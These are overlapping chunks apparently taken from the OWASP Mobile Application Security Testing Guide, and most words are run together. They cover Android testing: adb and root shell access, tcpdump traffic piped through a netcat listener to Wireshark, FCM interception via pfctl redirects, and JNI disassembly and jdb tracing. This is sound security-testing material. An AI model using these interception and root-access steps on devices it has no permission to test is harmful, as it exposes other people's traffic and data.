    "text": "thestateofasocket,forexample,ifthesocketisinactiveuse(ESTABLISHED)orclosed(CLOSED). Get Loaded Native Libraries Platform: android Using Process Memory Maps Thefile/proc/<pid>/mapscontainsthecurrentlymappedmemoryregionsandtheiraccesspermissions. Usingthisfile wecangetthelistofthelibrariesloadedintheprocess. ##cat/proc/9568/maps 12c00000-52c00000rw-p0000000000:0414917 /dev/ashmem/dalvik-mainspace (regionspace)(deleted) 6f019000-6f2c0000rw-p00000000fd:001146914 /data/dalvik-cache/arm64/system@framework@boot.art ... 7327670000-7329747000r--p00000000fd:001884627 /data/app/com.google.android.gms-4FJbDh-oZv-5bCw39jkIMQ==/oat/arm64/base.odex .. 733494d000-7334cfb000r-xp00000000fd:001884542 ↪ /data/app/com.google.android.youtube-Rl_hl9LptFQf3Vf-JJReGw==/lib/arm64/libcronet.80.0.3970.3.so ... Using Frida You can retrieve process related information straight from the Frida CLI by using the Process command. Within the ProcesscommandthefunctionenumerateModulesliststhelibrariesloadedintotheprocessmemory. [HuaweiNexus6P::sg.vantagepoint.helloworldjni]->Process.enumerateModules() [ { \"base\":\"0x558a442000\", \"name\": \"app_process64\", \"path\":\"/system/bin/app_process64\", \"size\":32768 }, { \"base\":\"0x78bc984000\", \"name\":\"libandroid_runtime.so\", \"path\":\"/system/lib64/libandroid_runtime.so\", \"size\":2011136 }, ... Accessing the Device Shell Platform: android Oneofthemostcommonthingsyoudowhentestinganappisaccessingthedeviceshell. Inthissectionwe’llseehow toaccesstheAndroidshellbothremotelyfromyourhostcomputerwith/withoutaUSBcableandlocallyfromthedevice itself. Remote Shell InordertoconnecttotheshellofanAndroiddevicefromyourhostcomputer,adbisusuallyyourtoolofchoice(unless youprefertouseremoteSSHaccess,e.g.viaTermux). 166\\nFor this section we assume that you’ve properly enabled Developer Mode and USB debugging as explained in “Testing on a Real Device”. Once you’ve connected your Android device via USB, you can access the remote device’s shell by running: adbshell pressControl+Dortypeexittoquit Onceintheremoteshell,ifyourdeviceisrootedoryou’reusingtheemulator,youcangetrootaccessbyrunningsu: bullhead:/$su bullhead:/ #id uid=0(root)gid=0(root)groups=0(root)context=u:r:su:s0 Onlyifyou’reworkingwithanemulatoryoumayalternativelyrestartadbwithrootpermissionswiththecommand adb root so next time you enter adb shell you’ll have root access already. This also allows to transfer data bidirectionallybetweenyourhostcomputerandtheAndroidfilesystem,evenwithaccesstolocationswhereonly therootuserhasaccessto(viaadbpush/pull). Seemoreaboutdatatransferinsection“Host-DeviceDataTransfer” below. Connect to Multiple Devices If you have more than one device, remember to include the -s flag followed by the device serial ID on all your adb commands(e.g.adb -s emulator-5554 shelloradb -s 00b604081540b7c6 shell). Youcangetalistofallconnected devicesandtheirserialIDsbyusingthefollowingcommand: adbdevices Listofdevicesattached 00c907098530a82c device emulator-5554 device Connect to a Device over Wi-Fi You can also access your Android device without using the USB cable. For this you’ll have to connect both your host computerandyourAndroiddevicetothesameWi-Finetworkandfollowthenextsteps: • ConnectthedevicetothehostcomputerwithaUSBcableandsetthetargetdevicetolistenforaTCP/IPconnection onport5555: adb tcpip 5555. • Disconnect the USB cable from the target device and run adb connect <device_ip_address>. Check that the deviceisnowavailablebyrunningadb devices. • Opentheshellwithadb shell. However,noticethatbydoingthisyouleaveyourdeviceopentoanyonebeinginthesamenetworkandknowingtheIP addressofyourdevice. YoumayratherpreferusingtheUSBconnection. Forexample,onaNexusdevice,youcanfindtheIPaddressatSettings->System->Aboutphone->Status ->IPaddressorbygoingtotheWi-Fimenuandtappingonceonthenetworkyou’reconnectedto. SeethefullinstructionsandconsiderationsintheAndroidDevelopersDocumentation. Connect to a Device via SSH Ifyouprefer,youcanalsoenableSSHaccess. AconvenientoptionistouseTermux,whichyoucaneasilyconfigureto offerSSHaccess(withpasswordorpublickeyauthentication)andstartitwiththecommandsshd(startsbydefaulton port 8022). In order to connect to the Termux via SSH you can simply run the command ssh -p 8022 <ip_address> (whereip_addressistheactualremotedeviceIP).Thisoptionhassomeadditionalbenefitsasitallowstoaccessthefile systemviaSFTPalsoonport8022. 167\\nOn-device Shell App Whileusuallyusinganon-deviceshell(terminalemulator)suchasTermuxmightbeverytediouscomparedtoaremote shell,itcanprovehandyfordebuggingincaseof,forexample,networkissuesortochecksomeconfiguration. Basic Network Monitoring/Sniffing Platform: android Remotely sniffing all Android traffic in real-time is possible with tcpdump, netcat (nc), and Wireshark. First, make sure thatyouhavethelatestversionofAndroidtcpdumponyourphone. Herearetheinstallationsteps: adbroot adbremount adbpush/wherever/you/put/tcpdump/system/xbin/tcpdump Ifexecutionofadbrootreturnstheerroradbdcannotrunasrootinproductionbuilds,installtcpdumpasfollows: adbpush/wherever/you/put/tcpdump/data/local/tmp/tcpdump adbshell su mount -orw,remount/system; cp/data/local/tmp/tcpdump/system/xbin/ cd/system/xbin chmod 755tcpdump Incertainproductionbuilds,youmightencounteranerrormount: '/system' not in /proc/mounts. Inthatcase,youcanreplacetheaboveline$mount-orw,remount/system;with$mount-orw,remount/,asdescribed inthisStackOverflowpost. Remember: Tousetcpdump,youneedrootprivilegesonthephone! Executetcpdumponcetoseeifitworks. Onceafewpacketshavecomein,youcanstoptcpdumpbypressingCTRL+c. $tcpdump tcpdump:verboseoutputsuppressed,use -vor-vvforfullprotocoldecode listeningonwlan0,link-typeEN10MB (Ethernet),capturesize262144bytes 04:54:06.59075100:9e:1e:10:7f:69 (ouiUnknown)>Broadcast,RRCP-0x23reply 04:54:09.65965800:9e:1e:10:7f:69 (ouiUnknown)>Broadcast,RRCP-0x23reply 04:54:10.57979500:9e:1e:10:7f:69 (ouiUnknown)>Broadcast,RRCP-0x23reply ^C 3packetscaptured 3packetsreceivedbyfilter 0packetsdroppedbykernel ToremotelysnifftheAndroidphone’snetworktraffic,firstexecutetcpdumpandpipeitsoutputtonetcat(nc): tcpdump -iwlan0 -s0-w-|nc-l-p11111 Thetcpdumpcommandaboveinvolves • listeningonthewlan0interface, • definingthesize(snapshotlength)ofthecaptureinbytestogeteverything(-s0),and • writingtoafile(-w). Insteadofafilename,wepass-,whichwillmaketcpdumpwritetostdout. Byusingthepipe(|),wesentalloutputfromtcpdumptonetcat,whichopensalisteneronport11111. You’llusuallywant tomonitorthewlan0interface. Ifyouneedanotherinterface,listtheavailableoptionswiththecommand$ ip addr. Toaccessport11111,youneedtoforwardtheporttoyourhostcomputerviaadb. 168\\nadbforwardtcp:11111tcp:11111 ThefollowingcommandconnectsyoutotheforwardedportvianetcatandpipingtoWireshark. nclocalhost11111 |wireshark -k-S-i- Wiresharkshouldstartimmediately(-k). Itgetsalldatafromstdin(-i-)vianetcat,whichisconnectedtotheforwarded port. Youshouldseeallthephone’strafficfromthewlan0interface. Youcandisplaythecapturedtrafficinahuman-readableformatwithWireshark. Figureoutwhichprotocolsareusedand whethertheyareunencrypted. Capturingalltraffic(TCPandUDP)isimportant,soyoushouldexecuteallfunctionsofthe testedapplicationandanalyzeit. Thisneatlittletrickallowsyounowtoidentifywhatkindofprotocolsareusedandtowhichendpointstheappistalkingto. Thequestionsisnow,howcanItesttheendpointsifBurpisnotcapableofshowingthetraffic? Thereisnoeasyanswer forthis,butafewBurppluginsthatcangetyoustarted. Firebase/Google Cloud Messaging (FCM/GCM) FirebaseCloudMessaging(FCM),thesuccessortoGoogleCloudMessaging(GCM),isafreeserviceofferedbyGooglethat allowsyoutosendmessagesbetweenanapplicationserverandclientapps. Theserverandclientappcommunicatevia theFCM/GCMconnectionserver,whichhandlesdownstreamandupstreammessages. 169\\nDownstreammessages(pushnotifications)aresentfromtheapplicationservertotheclientapp;upstreammessagesare sentfromtheclientapptotheserver. FCMisavailableforAndroid,iOS,andChrome. FCMcurrentlyprovidestwoconnectionserverprotocols: HTTPandXMPP.As describedintheofficialdocumentation,theseprotocolsareimplementeddifferently. Thefollowingexampledemonstrates howtointerceptbothprotocols. Preparation of Test Setup Youneedtoeitherconfigureiptablesonyourphoneorusebettercaptobeabletointercepttraffic. FCMcanuseeitherXMPPorHTTPtocommunicatewiththeGooglebackend. HTTP FCMusestheports5228,5229,and5230forHTTPcommunication. Usually,onlyport5228isused. • ConfigurelocalportforwardingfortheportsusedbyFCM.ThefollowingexampleappliestomacOS: $echo \" rdrpassinetprototcpfromanytoanyport5228->127.0.0.1port8080 rdrpassinetprototcpfromanytoanyport5229->127.0.0.1port8080 rdrpassinetprototcpfromanytoanyport5230->127.0.0.1port8080 \"|sudo pfctl -ef- • Theinterceptionproxymustlistentotheportspecifiedintheportforwardingruleabove(port8080). XMPP ForXMPPcommunication,FCMusesports5235(Production)and5236(Testing). • ConfigurelocalportforwardingfortheportsusedbyFCM.ThefollowingexampleappliestomacOS: $echo \" rdrpassinetprototcpfromanytoanyport5235->127.0.0.1port8080 rdrpassinetprototcpfromanytoanyport5236->127.0.0.1port8080 \"|sudo pfctl -ef- Intercepting the Requests Theinterceptionproxymustlistentotheportspecifiedintheportforwardingruleabove(port8080). StarttheappandtriggerafunctionthatusesFCM.YoushouldseeHTTPmessagesinyourinterceptionproxy. 170\\nEnd-to-End Encryption for Push Notifications Asanadditionallayerofsecurity,pushnotificationscanbeencryptedbyusingCapillary. Capillaryisalibrarytosimplify thesendingofend-to-end(E2E)encryptedpushmessagesfromJava-basedapplicationserverstoAndroidclients. Reviewing Disassembled Native Code Platform: android Followingtheexamplefrom“DisassemblingNativeCode”wewillusedifferentdisassemblerstoreviewthedisassembled nativecode. radare2 Onceyou’veopenedyourfileinradare2youshouldfirstgettheaddressofthefunctionyou’relookingfor. Youcandothis bylistingorgettinginformationiaboutthesymbolss(is)andgrepping(~radare2’sbuilt-ingrep)forsomekeyword,in ourcasewe’relookingforJNIrelatedsymbolssoweenter“Java”: $r2 -AHelloWord-JNI/lib/armeabi-v7a/libnative-lib.so ... [0x00000e3c]>is~Java 0030x00000e780x00000e78GLOBAL FUNC 16Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI Themethodcanbefoundataddress0x00000e78. Todisplayitsdisassemblysimplyrunthefollowingcommands: [0x00000e3c]>eemu.str=true; [0x00000e3c]>s0x00000e78 [0x00000e78]>af [0x00000e78]>pdf ╭(fcn)sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI12 │ sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI (int32_targ1); │ ;argint32_targ1@r0 │ 0x00000e78 ~ 0268 ldrr2, [r0] ;arg1 │ ;--aav.0x00000e79: │ ;UNKNOWNXREFfromaav.0x00000189 (+0x3) │ 0x00000e79 unaligned",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 75
    }
  },
  {
    "text": "Asanadditionallayerofsecurity,pushnotificationscanbeencryptedbyusingCapillary. Capillaryisalibrarytosimplify thesendingofend-to-end(E2E)encryptedpushmessagesfromJava-basedapplicationserverstoAndroidclients. Reviewing Disassembled Native Code Platform: android Followingtheexamplefrom“DisassemblingNativeCode”wewillusedifferentdisassemblerstoreviewthedisassembled nativecode. radare2 Onceyou’veopenedyourfileinradare2youshouldfirstgettheaddressofthefunctionyou’relookingfor. Youcandothis bylistingorgettinginformationiaboutthesymbolss(is)andgrepping(~radare2’sbuilt-ingrep)forsomekeyword,in ourcasewe’relookingforJNIrelatedsymbolssoweenter“Java”: $r2 -AHelloWord-JNI/lib/armeabi-v7a/libnative-lib.so ... [0x00000e3c]>is~Java 0030x00000e780x00000e78GLOBAL FUNC 16Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI Themethodcanbefoundataddress0x00000e78. Todisplayitsdisassemblysimplyrunthefollowingcommands: [0x00000e3c]>eemu.str=true; [0x00000e3c]>s0x00000e78 [0x00000e78]>af [0x00000e78]>pdf ╭(fcn)sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI12 │ sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI (int32_targ1); │ ;argint32_targ1@r0 │ 0x00000e78 ~ 0268 ldrr2, [r0] ;arg1 │ ;--aav.0x00000e79: │ ;UNKNOWNXREFfromaav.0x00000189 (+0x3) │ 0x00000e79 unaligned │ 0x00000e7a 0249 ldrr1,aav.0x00000f3c ;[0xe84:4]=0xf3caav.0x00000f3c │ 0x00000e7c d2f89c22 ldr.wr2,[r2,0x29c] │ 0x00000e80 7944 addr1,pc ;\"HellofromC++\" section..rodata ╰ 0x00000e82 1047 bxr2 Let’sexplainthepreviouscommands: 171\\n• eemu.str=true;enablesradare2’sstringemulation. Thankstothis,wecanseethestringwe’relookingfor(“Hello fromC++”). • s 0x00000e78isaseektotheaddresss 0x00000e78,whereourtargetfunctionislocated. Wedothissothatthe followingcommandsapplytothisaddress. • pdfmeansprintdisassemblyoffunction. Usingradare2youcanquicklyruncommandsandexitbyusingtheflags-qc '<commands>'. Fromthepreviousstepswe knowalreadywhattodosowewillsimplyputeverythingtogether: $r2 -qc'eemu.str=true;s0x00000e78;af;pdf' HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so ╭(fcn)sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI12 │ sym.Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI (int32_targ1); │ ;argint32_targ1@r0 │ 0x00000e78 0268 ldrr2, [r0] ;arg1 │ 0x00000e7a 0249 ldrr1, [0x00000e84] ;[0xe84:4]=0xf3c │ 0x00000e7c d2f89c22 ldr.wr2,[r2,0x29c] │ 0x00000e80 7944 addr1,pc ;\"HellofromC++\" section..rodata ╰ 0x00000e82 1047 bxr2 Noticethatinthiscasewe’renotstartingwiththe-Aflagnotrunningaaa. Instead,wejusttellradare2toanalyzethat onefunctionbyusingtheanalyzefunctionafcommand. Thisisoneofthosecaseswherewecanspeedupourworkflow becauseyou’refocusingonsomespecificpartofanapp. Theworkflowcanbefurtherimprovedbyusingr2ghidra,adeepintegrationofGhidradecompilerforradare2. r2ghidra generatesdecompiledCcode,whichcanaidinquicklyanalyzingthebinary. IDA Pro Weassumethatyou’vesuccessfullyopenedlib/armeabi-v7a/libnative-lib.soinIDApro. Oncethefileisloaded,click intothe“Functions”windowontheleftandpressAlt+ttoopenthesearchdialog. Enter“java”andhitenter. Thisshould highlight the Java_sg_vantagepoint_helloworld_ MainActivity_stringFromJNI function. Double-click the function tojumptoitsaddressinthedisassemblyWindow. “IdaView-A”shouldnowshowthedisassemblyofthefunction. Notalotofcodethere,butyoushouldanalyzeit. Thefirstthingyouneedtoknowisthatthefirstargumentpassedto everyJNIfunctionisaJNIinterfacepointer. Aninterfacepointerisapointertoapointer. Thispointerpointstoafunction table: anarrayofevenmorepointers,eachofwhichpointstoaJNIinterfacefunction(isyourheadspinningyet?). The functiontableisinitializedbytheJavaVMandallowsthenativefunctiontointeractwiththeJavaenvironment. Withthatinmind,let’shavealookateachlineofassemblycode. 172\\nLDR R2,[R0] Remember: thefirstargument(inR0)isapointertotheJNIfunctiontablepointer. TheLDRinstructionloadsthisfunction tablepointerintoR2. LDR R1,=aHelloFromC ThisinstructionloadsintoR1thePC-relativeoffsetofthestring“HellofromC++”. Notethatthisstringcomesdirectly after the end of the function block at offset 0xe84. Addressing relative to the program counter allows the code to run independentlyofitspositioninmemory. LDR.W R2,[R2,#0x29C] Thisinstructionloadsthefunctionpointerfromoffset0x29CintotheJNIfunctionpointertablepointedtobyR2. Thisis theNewStringUTFfunction. Youcanlookatthelistoffunctionpointersinjni.h,whichisincludedintheAndroidNDK.The functionprototypelookslikethis: jstring (*NewStringUTF)(JNIEnv*,const char*); Thefunctiontakestwoarguments: theJNIEnvpointer(alreadyinR0)andaStringpointer. Next,thecurrentvalueofPC isaddedtoR1,resultingintheabsoluteaddressofthestaticstring“HellofromC++”(PC+offset). ADD R1,PC Finally,theprogramexecutesabranchinstructiontotheNewStringUTFfunctionpointerloadedintoR2: BX R2 Whenthisfunctionreturns,R0containsapointertothenewlyconstructedUTFstring. Thisisthefinalreturnvalue,soR0 isleftunchangedandthefunctionreturns. Ghidra AfteropeningthelibraryinGhidrawecanseeallthefunctionsdefinedintheSymbolTreepanelunderFunctions. The nativelibraryforthecurrentapplicationisrelativelyverysmall. Therearethreeuserdefinedfunctions: FUN_001004d0, FUN_0010051c,andJava_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI.Theothersymbolsarenot userdefinedandaregeneratedforproperfunctioningofthesharedlibrary. TheinstructionsinthefunctionJava_sg_- vantagepoint_helloworldjni_MainActivity_stringFromJNI are already discussed in detail in previous sections. In thissectionwecanlookintothedecompilationofthefunction. Inside the current function there is a call to another function, whose address is obtained by accessing an offset in the JNIEnvpointer(foundasplParm1). Thislogichasbeendiagrammaticallydemonstratedaboveaswell. Thecorresponding CcodeforthedisassembledfunctionisshownintheDecompilerwindow. ThisdecompiledCcodemakesitmucheasier tounderstandthefunctioncallbeingmade. Sincethisfunctionissmallandextremelysimple,thedecompilationoutput isveryaccurate,thiscanchangedrasticallywhendealingwithcomplexfunctions. 173\\nDisassembling Native Code Platform: android Dalvik and ART both support the Java Native Interface (JNI), which defines a way for Java code to interact with native codewritteninC/C++. AsonotherLinux-basedoperatingsystems,nativecodeispackaged(compiled)intoELFdynamic libraries (*.so), which the Android app loads at runtime via the System.load method. However, instead of relying on widelyusedClibraries(suchasglibc),AndroidbinariesarebuiltagainstacustomlibcnamedBionic. Bionicaddssupport forimportantAndroid-specificservicessuchassystempropertiesandlogging,anditisnotfullyPOSIX-compatible. WhenreversinganAndroidapplicationcontainingnativecode,weneedtounderstandacoupleofdatastructuresrelated totheJNIbridgebetweenJavaandnativecode. Fromthereversingperspective, weneedtobeawareoftwokeydata structures: JavaVMandJNIEnv. Bothofthemarepointerstopointerstofunctiontables: • JavaVM provides an interface to invoke functions for creating and destroying a JavaVM. Android allows only one JavaVMperprocessandisnotreallyrelevantforourreversingpurposes. • JNIEnvprovidesaccesstomostoftheJNIfunctionswhichareaccessibleatafixedoffsetthroughtheJNIEnvpointer. ThisJNIEnvpointeristhefirstparameterpassedtoeveryJNIfunction. Wewilldiscussthisconceptagainwiththe helpofanexamplelaterinthischapter. ItisworthhighlightingthatanalyzingdisassemblednativecodeismuchmorechallengingthandisassembledJavacode. WhenreversingthenativecodeinanAndroidapplicationwewillneedadisassembler. Inthenextexamplewe’llreversetheHelloWorld-JNI.apkfromtheOWASPMASTGrepository. Installingandrunningitin anemulatororAndroiddeviceisoptional. wget https://github.com/OWASP/owasp-mastg/raw/master/Samples/Android/01_HelloWorld-JNI/HelloWord-JNI.apk Thisappisnotexactlyspectacular,allitdoesisshowalabelwiththetext“HellofromC++”. ThisistheappAndroid generatesbydefaultwhenyoucreateanewprojectwithC/C++support, whichisjustenoughtoshowthebasic principlesofJNIcalls. 174\\nDecompiletheAPKwithapkx. $apkxHelloWord-JNI.apk ExtractingHelloWord-JNI.apktoHelloWord-JNI Converting:classes.dex ->classes.jar (dex2jar) dex2jarHelloWord-JNI/classes.dex ->HelloWord-JNI/classes.jar DecompilingtoHelloWord-JNI/src (cfr) ThisextractsthesourcecodeintotheHelloWord-JNI/srcdirectory. ThemainactivityisfoundinthefileHelloWord-JNI/ src/sg/vantagepoint/helloworldjni/MainActivity.java. The“HelloWorld”textviewispopulatedintheonCreate method: public class MainActivity extends AppCompatActivity { static { System.loadLibrary(\"native-lib\"); } @Override protected void onCreate(Bundlebundle){ super.onCreate(bundle); this.setContentView(2130968603); ((TextView)this.findViewById(2131427422)).setText((CharSequence)this. \\ stringFromJNI()); } public native String stringFromJNI(); } NotethedeclarationofpublicnativeStringstringFromJNIatthebottom. Thekeyword“native”tellstheJavacompiler thatthismethodisimplementedinanativelanguage. Thecorrespondingfunctionisresolvedduringruntime,butonlyif anativelibrarythatexportsaglobalsymbolwiththeexpectedsignatureisloaded(signaturescompriseapackagename, classname,andmethodname). Inthisexample,thisrequirementissatisfiedbythefollowingCorC++function: JNIEXPORTjstringJNICALLJava_sg_vantagepoint_helloworld_MainActivity_stringFromJNI(JNIEnv *env,jobject) Sowhereisthenativeimplementationofthisfunction? Ifyoulookintothe“lib”directoryoftheunzippedAPKarchive, you’ll see several subdirectories (one per supported processor architecture), each of them containing a version of the nativelibrary,inthiscaselibnative-lib.so. WhenSystem.loadLibraryiscalled,theloaderselectsthecorrectversion basedonthedevicethattheappisrunningon. Beforemovingahead,payattentiontothefirstparameterpassedtothe currentJNIfunction. ItisthesameJNIEnvdatastructurewhichwasdiscussedearlierinthissection. 175\\nFollowing the naming convention mentioned above, you can expect the library to export a symbol called Java_sg_- vantagepoint_helloworld_MainActivity_stringFromJNI.OnLinuxsystems,youcanretrievethelistofsymbolswith readelf(includedinGNUbinutils)ornm. DothisonmacOSwiththegreadelftool,whichyoucaninstallviaMacportsor Homebrew. Thefollowingexampleusesgreadelf: $greadelf -W-slibnative-lib.so |grep Java 3:00004e49 112FUNC GLOBALDEFAULT 11Java_sg_vantagepoint_helloworld_MainActivity_stringFromJNI Youcanalsoseethisusingradare2’srabin2: $rabin2 -sHelloWord-JNI/lib/armeabi-v7a/libnative-lib.so |grep -iJava 0030x00000e780x00000e78GLOBAL FUNC 16Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI ThisisthenativefunctionthateventuallygetsexecutedwhenthestringFromJNInativemethodiscalled. Todisassemblethecode,youcanloadlibnative-lib.sointoanydisassemblerthatunderstandsELFbinaries(i.e.,any disassembler). Iftheappshipswithbinariesfordifferentarchitectures,youcantheoreticallypickthearchitectureyou’re mostfamiliarwith,aslongasitiscompatiblewiththedisassembler. Eachversioniscompiledfromthesamesourceand implements the same functionality. However, if you’re planning to debug the library on a live device later, it’s usually wisetopickanARMbuild. To support both older and newer ARM processors, Android apps ship",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 76
    }
  },
  {
    "text": "Java 3:00004e49 112FUNC GLOBALDEFAULT 11Java_sg_vantagepoint_helloworld_MainActivity_stringFromJNI Youcanalsoseethisusingradare2’srabin2: $rabin2 -sHelloWord-JNI/lib/armeabi-v7a/libnative-lib.so |grep -iJava 0030x00000e780x00000e78GLOBAL FUNC 16Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI ThisisthenativefunctionthateventuallygetsexecutedwhenthestringFromJNInativemethodiscalled. Todisassemblethecode,youcanloadlibnative-lib.sointoanydisassemblerthatunderstandsELFbinaries(i.e.,any disassembler). Iftheappshipswithbinariesfordifferentarchitectures,youcantheoreticallypickthearchitectureyou’re mostfamiliarwith,aslongasitiscompatiblewiththedisassembler. Eachversioniscompiledfromthesamesourceand implements the same functionality. However, if you’re planning to debug the library on a live device later, it’s usually wisetopickanARMbuild. To support both older and newer ARM processors, Android apps ship with multiple ARM builds compiled for different ApplicationBinaryInterface(ABI)versions. TheABIdefineshowtheapplication’smachinecodeissupposedtointeract withthesystematruntime. ThefollowingABIsaresupported: • armeabi: ABIisforARM-basedCPUsthatsupportatleasttheARMv5TEinstructionset. • armeabi-v7a: ThisABIextendsarmeabitoincludeseveralCPUinstructionsetextensions. • arm64-v8a: ABIforARMv8-basedCPUsthatsupportAArch64,thenew64-bitARMarchitecture. Mostdisassemblerscanhandleanyofthosearchitectures. Below,we’llbeviewingthearmeabi-v7aversion(locatedin HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so)inradare2andinIDAPro. Seethesection“ReviewingDisassem- bledNativeCode”belowtolearnonhowtoproceedwheninspectingthedisassemblednativecode. radare2 Toopenthefileinradare2youonlyhavetorunr2-AHelloWord-JNI/lib/armeabi-v7a/libnative-lib.so. Thechapter “Android Basic Security Testing” already introduced radare2. Remember that you can use the flag -A to run the aaa commandrightafterloadingthebinaryinordertoanalyzeallreferencedcode. $r2 -AHelloWord-JNI/lib/armeabi-v7a/libnative-lib.so [x]Analyzeallflagsstartingwithsym.andentry0 (aa) [x]Analyzefunctioncalls (aac) [x]Analyzelenbytesofinstructionsforreferences (aar) [x]Checkforobjcreferences 176\\n[x]Checkforvtables [x]Findingxrefsinnoncodesectionwithanal.in=io.maps [x]Analyzevaluepointers (aav) [x]Valuefrom0x00000000to0x00001dcf (aav) [x]0x00000000-0x00001dcfin0x0-0x1dcf (aav) [x]Emulatecodetofindcomputedreferences (aae) [x]Typematchinganalysisforallfunctions (aaft) [x]Use -AAoraaaatoperformadditionalexperimentalanalysis. --Printthecontentsofthecurrentblockwiththe 'p'command [0x00000e3c]> Note that for bigger binaries, starting directly with the flag -A might be very time consuming as well as unnecessary. Dependingonyourpurpose,youmayopenthebinarywithoutthisoptionandthenapplyalesscomplexanalysislikeaa oramoreconcretetypeofanalysissuchastheonesofferedinaa(basicanalysisofallfunctions)oraac(analyzefunction calls). Remembertoalwaystype? togetthehelporattachittocommandstoseeevenmorecommandoroptions. For example,ifyouenteraa? you’llgetthefulllistofanalysiscommands. [0x00001760]>aa? Usage:aa[0*?] #seealso'af'and'afna' |aa aliasfor 'af@@sym.*;af@entry0;afva' |aaa[?] autonamefunctionsafteraa (seeafna) |aab abbacrossbin.sections.rx |aac[len] analyzefunctioncalls (af@@ `pilen~call[1]`) |aac* [len] flagfunctioncallswithoutperformingacompleteanalysis |aad[len] analyzedatareferencestocode |aae[len]([addr]) analyzereferenceswithESIL (optionallytoaddress) |aaf[e|t] analyzeallfunctions (eanal.hasnext=1;afr@@c:isq)(aafe=aef@@f) |aaF[sym*] setanal.in=blockforallthespacesbetweenflagsmatchingglob |aaFa [sym*] sameasaaFbutusesaf/a2finsteadofaf+/afb+ (slowerbutmoreaccurate) |aai[j] showinfoofallanalysisparameters |aan autonamefunctionsthateitherstartwithfcn.*orsym.func.* |aang findfunctionandsymbolnamesfromgolangbinaries |aao analyzeallobjcreferences |aap findandanalyzefunctionpreludes |aar[?][len] analyzelenbytesofinstructionsforreferences |aas[len] analyzesymbols (af@@= `isq~[0]`) |aaS analyzeallflagsstartingwithsym. (af@@sym.*) |aat[len] analyzeallconsecutivefunctionsinsection |aaT[len] analyzecodeaftertrap-sleds |aau[len] listmemareas (largerthanlenbytes)notcoveredbyfunctions |aav[sat] findvaluesreferencingaspecificsectionormap Thereisathingthatisworthnoticingaboutradare2vsotherdisassemblerslikee.g.IDAPro. Thefollowingquotefrom thisarticleofradare2’sblog(https://radareorg.github.io/blog/)offersagoodsummary. Codeanalysisisnotaquickoperation,andnotevenpredictableortakingalineartimetobeprocessed. Thismakes startingtimesprettyheavy,comparedtojustloadingtheheadersandstringsinformationlikeit’sdonebydefault. People that are used to IDA or Hopper just load the binary, go out to make a coffee and then when the analysis isdone, they startdoingthemanualanalysis tounderstandwhattheprogramis doing. It’s truethatthosetools performtheanalysisinbackground,andtheGUIisnotblocked. ButthistakesalotofCPUtime,andr2aimstorun inmanymoreplatformsthanjusthigh-enddesktopcomputers. Thissaid,pleaseseesection“ReviewingDisassembledNativeCode”tolearnmorebouthowradare2canhelpusperform- ingourreversingtasksmuchfaster. Forexample,gettingthedisassemblyofaspecificfunctionisatrivialtaskthatcan beperformedinonecommand. IDA Pro IfyouownanIDAProlicense,openthefileandonceinthe“Loadnewfile”dialog,choose“ELFforARM(SharedObject)” asthefiletype(IDAshoulddetectthisautomatically),and“ARMLittle-Endian”astheprocessortype. 177\\nThefreewareversionofIDAProunfortunatelydoesnotsupporttheARMprocessortype. Execution Tracing Platform: android Besides being useful for debugging, the jdb command line tool offers basic execution tracing functionality. To trace an apprightfromthestart,youcanpausetheappwiththeAndroid“WaitforDebugger”featureorakill -STOPcommand andattachjdbtosetadeferredmethodbreakpointonanyinitializationmethod. Oncethebreakpointisreached,activate methodtracingwiththetrace go methodscommandandresumeexecution. jdbwilldumpallmethodentriesandexits fromthatpointonwards. $adbforwardtcp:7777jdwp:7288 ${echo \"suspend\";cat;}|jdb-attach localhost:7777 Setuncaughtjava.lang.Throwable Setdeferreduncaughtjava.lang.Throwable Initializingjdb... >Allthreadssuspended. >stop incom.acme.bob.mobile.android.core.BobMobileApplication.<clinit>() Deferringbreakpointcom.acme.bob.mobile.android.core.BobMobileApplication.<clinit>(). Itwillbesetaftertheclassisloaded. >resume Allthreadsresumed.M Setdeferredbreakpointcom.acme.bob.mobile.android.core.BobMobileApplication.<clinit>() Breakpointhit: \"thread=main\",com.acme.bob.mobile.android.core.BobMobileApplication.<clinit>(),line=44 bci=0 main[1]tracegomethods main[1]resume Methodentered:Allthreadsresumed. The Dalvik Debug Monitor Server (DDMS) is a GUI tool included with Android Studio. It may not look like much, but its Javamethodtracerisoneofthemostawesometoolsyoucanhaveinyourarsenal,anditisindispensableforanalyzing obfuscatedbytecode. DDMS is somewhat confusing, however; it can be launched several ways, and different trace viewers will be launched depending on how a method was traced. There’s a standalone tool called “Traceview” as well as a built-in viewer in AndroidStudio,bothofwhichofferdifferentwaystonavigatethetrace. You’llusuallyuseAndroidstudio’sbuilt-inviewer, whichgivesyouazoomablehierarchicaltimelineofallmethodcalls. However,thestandalonetoolisalsouseful,ithasa profilepanelthatshowsthetimespentineachmethodalongwiththeparentsandchildrenofeachmethod. TorecordanexecutiontraceinAndroidStudio,opentheAndroidtabatthebottomoftheGUI.Selectthetargetprocess inthelistandclickthelittlestopwatchbuttonontheleft. Thisstartstherecording. Onceyou’redone,clickthesame buttontostoptherecording. Theintegratedtraceviewwillopenandshowtherecordedtrace. Youcanscrollandzoom thetimelineviewwiththemouseortrackpad. ExecutiontracescanalsoberecordedinthestandaloneAndroidDeviceMonitor. TheDeviceMonitorcanbestartedwithin AndroidStudio(Tools->Android->AndroidDeviceMonitor)orfromtheshellwiththeddmscommand. To start recording tracing information, select the target process in the Devices tab and click Start Method Profiling. Clickthestopbuttontostoprecording,afterwhichtheTraceviewtoolwillopenandshowtherecordedtrace. Clicking anyofthemethodsintheprofilepanelhighlightstheselectedmethodinthetimelinepanel. 